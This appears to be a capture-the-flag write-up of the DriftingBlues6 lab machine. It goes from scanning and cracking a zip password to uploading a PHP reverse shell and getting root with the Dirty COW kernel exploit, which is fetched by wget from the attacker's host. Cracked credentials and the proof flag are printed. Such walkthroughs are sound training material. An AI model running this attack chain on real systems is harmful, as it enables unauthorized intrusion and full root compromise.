## Initial NMAP scan:

```bash
┌──(parallels㉿V35HR4J)-[/tmp]
└─$ nmap 192.168.205.219 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-18 17:17 +0545
Nmap scan report for 192.168.205.219
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
80/tcp   open     http
1031/tcp filtered iad2

Nmap done: 1 IP address (1 host up) scanned in 17.83 seconds
```

There's some hint for us on `/robots.txt`:

```
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

```bash
┌──(parallels㉿V35HR4J)-[/tmp]
└─$ ffuf -u http://192.168.205.219/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic -e .zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.219/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index                   [Status: 200, Size: 750, Words: 44, Lines: 76]
                        [Status: 200, Size: 750, Words: 44, Lines: 76]
db                      [Status: 200, Size: 53656, Words: 196, Lines: 212]
robots                  [Status: 200, Size: 110, Words: 11, Lines: 6]
spammer                 [Status: 200, Size: 179, Words: 3, Lines: 2]
spammer.zip             [Status: 200, Size: 179, Words: 3, Lines: 2]
```

After downloading the spammer.zip file, it is password protected, we can use `zip2john` to bruteforce the password:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/DriftingBlues6]
└─$ zip2john spammer.zip 
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
spammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zip
                                                                                                                                                                                
┌──(parallels㉿V35HR4J)-[~/tjnull/DriftingBlues6]
└─$ zip2john spammer.zip>hash.txt
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
                                                                                                                                                                                
┌──(parallels㉿V35HR4J)-[~/tjnull/DriftingBlues6]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE (2023-12-18 17:29) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got the password myspace4, now we can unzip the file and get the creds.txt file:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/DriftingBlues6]
└─$ unzip spammer.zip 
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt 

┌──(parallels㉿V35HR4J)-[~/tjnull/DriftingBlues6]
└─$ cat creds.txt                         
mayer:lionheart
```

Now since we know the creds, we can try to login to the portal, after loggining in we can see that we could actually upload a file, we can upload a php reverse shell, and trigger it through http://192.168.205.219/textpattern/files/shell.php which gives us a shell as www-data.

## Privilege Escalation:

```bash
www-data@driftingblues:/var$ uname -a
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```
dirty.c
We can see that the kernel version is 3.2.0-4-amd64, we can search for any exploit for this kernel version, we can find this [article](https://www.exploit-db.com/exploits/40839) which explains the exploit vulnerable to this kernel version.

```bash
www-data@driftingblues:/tmp$ wget 192.168.45.230:1234/dirty.c
wget 192.168.45.230:1234/dirty.c
--2023-12-18 05:56:37--  http://192.168.45.230:1234/dirty.c
Connecting to 192.168.45.230:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3713 (3.6K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 3,713       --.-K/s   in 0s      

2023-12-18 05:56:37 (952 MB/s) - `dirty.c' saved [3713/3713]

www-data@driftingblues:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
www-data@driftingblues:/tmp$ chmod +x dirty&&./dirty
chmod +x dirty&&./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: test123

Complete line:
firefart:fiKBbJoc.sTuE:0:0:pwned:/root:/bin/bash

www-data@driftingblues:/tmp$ su firefart
su firefart
Password: test123

firefart@driftingblues:/tmp# id&&cat /root/proof.txt
id&&cat /root/proof.txt
uid=0(firefart) gid=0(root) groups=0(root)
1c71ffc08c419a2f6a00525cb7d34e32
```